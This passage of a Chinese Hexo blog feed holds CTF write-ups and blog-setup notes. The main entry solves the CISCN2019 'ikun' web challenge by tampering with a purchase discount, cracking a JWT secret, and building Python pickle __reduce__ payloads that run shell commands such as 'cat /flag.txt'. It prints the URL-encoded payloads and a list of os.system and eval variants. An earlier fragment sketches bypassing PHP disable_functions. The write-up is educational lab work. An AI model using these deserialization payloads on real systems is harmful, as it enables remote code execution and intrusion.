</p><p>readflag打开看完应该是一个可执行的文件，执行完应该就有flag。</p><p>但是由于disable_function，所以要进行绕过</p><h6 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h6><p>利用蚁剑插件绕过disable_function，得翻墙下载，或者网上找资源，其次是在Linux下使用的。所以在kali安装后直接使用，使用后进入蚁剑终端执行&#x2F;readflag即可</p><h6 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h6><p>看不大懂。不过理解就是编写恶意文件恶意函数，使系统在执行一个进程时候将优先级更高的恶意文件恶意函数先进行调用。</p><p>var&#x2F;tmp有上传权限，可以上传恶意</p><p>难难，，挖坑待补。。</p><p>原理：</p><p><a href="https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>参考：</p><p><a href="https://blog.csdn.net/qq_45699846/article/details/123388028">https://blog.csdn.net/qq_45699846/article/details/123388028</a></p><p><a href="https://blog.csdn.net/m0_62879498/article/details/124803318">https://blog.csdn.net/m0_62879498/article/details/124803318</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">https://blog.csdn.net/qq_45521281/article/details/105656737</a></p><p><a href="https://guokeya.github.io/post/hwKOeu6uW/">https://guokeya.github.io/post/hwKOeu6uW/</a></p><p><a href="https://www.cnblogs.com/yesec/p/12483631.html">https://www.cnblogs.com/yesec/p/12483631.html</a></p><p><a href="https://www.anquanke.com/post/id/175403#h2-0">https://www.anquanke.com/post/id/175403#h2-0</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html">https://www.cnblogs.com/leixiao-/p/10612798.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;题目源码&quot;&gt;&lt;a href=&quot;#题目源码&quot; class=&quot;headerlink&quot; title=&quot;题目源码&quot;&gt;&lt;/a&gt;题目源码&lt;/h4&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;</summary>
      
    
    
    
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
    <category term="rce" scheme="http://van0308.github.io/tags/rce/"/>
    
    <category term="php" scheme="http://van0308.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>待学</title>
    <link href="http://van0308.github.io/2023/02/03/%E5%BE%85%E5%AD%A6/"/>
    <id>http://van0308.github.io/2023/02/03/%E5%BE%85%E5%AD%A6/</id>
    <published>2023-02-03T15:47:07.000Z</published>
    <updated>2023-02-05T06:43:29.846Z</updated>
    
    <content type="html"><![CDATA[<p>pickle反序列化</p><p>代码执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;pickle反序列化&lt;/p&gt;
&lt;p&gt;代码执行&lt;/p&gt;
</summary>
      
    
    
    
    <category term="ctf" scheme="http://van0308.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web2]ikun </title>
    <link href="http://van0308.github.io/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/"/>
    <id>http://van0308.github.io/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/</id>
    <published>2023-02-03T15:46:44.000Z</published>
    <updated>2023-02-08T14:52:24.041Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初步发现"><a href="#初步发现" class="headerlink" title="初步发现"></a>初步发现</h4><p>打开发现是商场购物页面</p><p>提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面</p><p>点商品，注意有两个，一个是商品详情页，一个是直接点购买</p><p>抓包发现</p><p>有price还有折扣，发现改price怎么改都不行，那么就试试只改折扣。</p><p>暴露了后台地址，访问发现只能admin</p><p>又注意到抓包有jwt。</p><p>解密 <a href="https://jwt.io/">https://jwt.io/</a></p><p>要改则必须破解密码 利用 c-jwt-cracker</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack   加密后的结果</span><br></pre></td></tr></table></figure><p>密钥1Kun</p><p>改完重新发包，点击一键成为大会员没什么用</p><h4 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h4><p>看源代码，发现泄露，下载完审计</p><p>发现有hint</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br><span class="line">Unicode解码得</span><br><span class="line">这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里</span><br></pre></td></tr></table></figure><p>找后门</p><p>在Admin.py找到</p><h4 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h4><p>pickle：Python对象的持久化存储</p><p>功能：将任意Python对象存储及恢复</p><p>关键函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump()   文件</span><br><span class="line">pickle.load()</span><br><span class="line">pickle.dumps()字符串</span><br><span class="line">pickle.loads()</span><br><span class="line">dump()：将 Python 中的对象序列化成二进制对象，并写入文件；</span><br><span class="line">load()：读取指定的序列化数据文件，并返回对象。</span><br><span class="line">dumps()：将 Python 中的对象序列化成二进制对象，并返回；</span><br><span class="line">loads()：读取给定的二进制对象数据，并将其转换为 Python 对象；</span><br></pre></td></tr></table></figure><p>具体用法</p><p>​<a href="http://c.biancheng.net/view/5736.html">Python pickle模块：实现Python对象的持久化存储 (biancheng.net)</a></p><p>反序列化详解</p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p>只要在序列化中的字符串中存在<code>R</code>指令，<code>__reduce__</code>方法就会被执行，无论正常程序中是否写明了<code>__reduce__</code>方法</p><p>记得生成payload时使用的python版本尽量与目标上的版本一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br><span class="line"></span><br><span class="line">urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式</span><br><span class="line">pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</span><br><span class="line"></span><br><span class="line">在 Python2.x 中的用法是：</span><br><span class="line">urllib.quote(text)</span><br><span class="line">Python3.x 中是</span><br><span class="line">urllib.parse.quote(text)</span><br><span class="line">URL 中传参数的部分（query String），格式是：</span><br><span class="line">name1=value1&amp;name2=value2&amp;name3=value3</span><br><span class="line">假如你的 name 或者 value 值中有『&amp;』或者『=』等符号，就当然会有问题。所以URL中的参数字符串也需要把『&amp;=』等符号进行编码。</span><br><span class="line">URL编码的方式是把需要编码的字符转化为 %xx 的形式。</span><br></pre></td></tr></table></figure><p>继续做题</p><p>点击一键成为大会员，抓包发现become参数，利用reduce方法构造poc，修改become值，执行命令</p><p>Python2和Python3的执行结果不同，下面Python2的成功了（不明原因）</p><p>读取目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))<span class="comment"># reduce第二个参数得是元组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#print a</span></span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="comment"># cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.  </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># cnt%0Alistdir%0Ap0%0A%28V/%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><p>最后执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="comment"># return (os.listdir, (&#x27;/&#x27;,))</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># c__builtin__%0Aeval%0Ap0%0A%28V__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">一些可执行的</span><br><span class="line"><span class="comment"># 未导入os模块，通用</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;calc.exe&#x27;</span>,))</span><br><span class="line"><span class="comment"># return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"><span class="comment"># return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 导入os模块</span></span><br><span class="line"> <span class="comment"># return (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return eval, (&quot;os.system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"> <span class="comment"># return map, (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return map, (os.system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> <span class="comment"># return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span></span><br></pre></td></tr></table></figure><h4 id="深入学习："><a href="#深入学习：" class="headerlink" title="深入学习："></a>深入学习：</h4><p><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结 - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/sijidou/p/16305695.html">CTF-python pickle反序列化 - sijidou - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.secpulse.com/archives/127664.html">python反序列化攻击 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初步发现&quot;&gt;&lt;a href=&quot;#初步发现&quot; class=&quot;headerlink&quot; title=&quot;初步发现&quot;&gt;&lt;/a&gt;初步发现&lt;/h4&gt;&lt;p&gt;打开发现是商场购物页面&lt;/p&gt;
&lt;p&gt;提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv</summary>
      
    
    
    
    <category term="ctf" scheme="http://van0308.github.io/categories/ctf/"/>
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="pickle反序列化" scheme="http://van0308.github.io/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>hexo+GitHub+butterfly</title>
    <link href="http://van0308.github.io/2023/02/03/hexo-GitHub-butterfly/"/>
    <id>http://van0308.github.io/2023/02/03/hexo-GitHub-butterfly/</id>
    <published>2023-02-03T14:16:02.000Z</published>
    <updated>2023-02-09T09:59:04.268Z</updated>
    
    <content type="html"><![CDATA[<h4 id="hexo操作"><a href="#hexo操作" class="headerlink" title="hexo操作"></a>hexo操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在blog文件夹下打开git bash（存放hexo源码那个文件夹）</span><br><span class="line">hexo clean 清除</span><br><span class="line">hexo g  生成</span><br><span class="line">hexo s  本地模拟</span><br><span class="line">hexo d  上传到远端</span><br><span class="line">重新上传得要  先清除、生成再上传</span><br><span class="line"></span><br><span class="line">hexo n &quot;title&quot;  新建文章  最好后面是双引号包裹的</span><br></pre></td></tr></table></figure><h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p>图床，就是专门用来存放图片的服务器，更多的是指提供图片外链的服务，有免费图床，也有付费图床。</p><h3 id="hexo坑"><a href="#hexo坑" class="headerlink" title="hexo坑"></a>hexo坑</h3><h4 id="文章标题"><a href="#文章标题" class="headerlink" title="文章标题"></a>文章标题</h4><p>如果是标题为[CISCN2019 华北赛区 Day1 Web2]ikun则会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR Process failed: _posts/111.md</span><br><span class="line">YAMLException: bad indentation of a mapping entry (1:34)</span><br><span class="line"></span><br><span class="line"> 1 | title: [CISCN2019 华北赛区 Day1 Web2]ikun</span><br><span class="line">--------------------------------------^</span><br><span class="line"> 2 | date: 2023-02-03 23:46:44</span><br><span class="line"> 3 | tags:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果改成其他的则不会，不过有些不符合规则还是会</p><p>解决：加双引号，不过命令行加双引号解决不了，得先破坏掉[]后，再在md文件   title: “[CISCN2019 华北赛区 Day1 Web2]ikun “</p><h4 id="报错、缩进问题"><a href="#报错、缩进问题" class="headerlink" title="报错、缩进问题"></a>报错、缩进问题</h4><p><a href="https://www.yamllint.com/">https://www.yamllint.com/</a>    可以在这个网站里面检查</p><h4 id="命令报错"><a href="#命令报错" class="headerlink" title="命令报错"></a>命令报错</h4><p>Npm 报错 可能得管理员打开powershell</p><h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><h4 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h4><p><a href="https://hexo.io/zh-cn/docs/writing">写作 | Hexo</a></p><p><a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><h4 id="一些教程"><a href="#一些教程" class="headerlink" title="一些教程"></a>一些教程</h4><p><a href="https://www.bilibili.com/read/cv12633102">2021最全hexo搭建博客+matery美化+使用（保姆级教程） - 哔哩哔哩 (bilibili.com)</a></p><h4 id="便捷化"><a href="#便捷化" class="headerlink" title="便捷化"></a>便捷化</h4><p>hexo-admin  <a href="https://jaredforsyth.com/hexo-admin/admin/#/">Hexo Admin (jaredforsyth.com)</a></p><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>目录 </p><p>代码块</p><h5 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h5><p>博客显示不出来全部：本地的会有些问题，到服务端就不怎么会了</p><p>在博文类，代码块前面会有123456789101112131415161718192021222324252627282930313233343536373839404142 这些数字？？？？？</p><p>各种页面</p><p>在各种页面的index.md中，type加上各自的属性</p><p>如type: “categories”</p><h5 id="多个标签"><a href="#多个标签" class="headerlink" title="多个标签"></a>多个标签</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tags: </span><br><span class="line">  - php</span><br><span class="line">  - rce</span><br><span class="line">  - 坑</span><br><span class="line">  注意-后有空格</span><br></pre></td></tr></table></figure><h4 id="一些教学"><a href="#一些教学" class="headerlink" title="一些教学"></a>一些教学</h4><p><a href="https://guguge.top/blog/butterfly/">Hexo-butterfly主题设置文档 | 咕咕鸽 (guguge.top)</a></p><p><a href="https://zhu-dongya.gitee.io/posts/hexo-butterfly-02/">Hexo+Butterfly系列：主题魔改（二） | ZhuDongya’s Blog (gitee.io)</a></p><p><a href="https://www.cnblogs.com/ldu-xingjiahui/p/12594024.html">短短1天我学会了如何修改Butterfly的配置文件 - XJHui - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html">Butterfly美化 - MoYu-zc - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;hexo操作&quot;&gt;&lt;a href=&quot;#hexo操作&quot; class=&quot;headerlink&quot; title=&quot;hexo操作&quot;&gt;&lt;/a&gt;hexo操作&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    
    <category term="个人博客" scheme="http://van0308.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://van0308.github.io/2023/02/02/hello-world/"/>
    <id>http://van0308.github.io/2023/02/02/hello-world/</id>
    <published>2023-02-02T09:13:27.137Z</published>
    <updated>2023-02-02T09:13:27.137Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
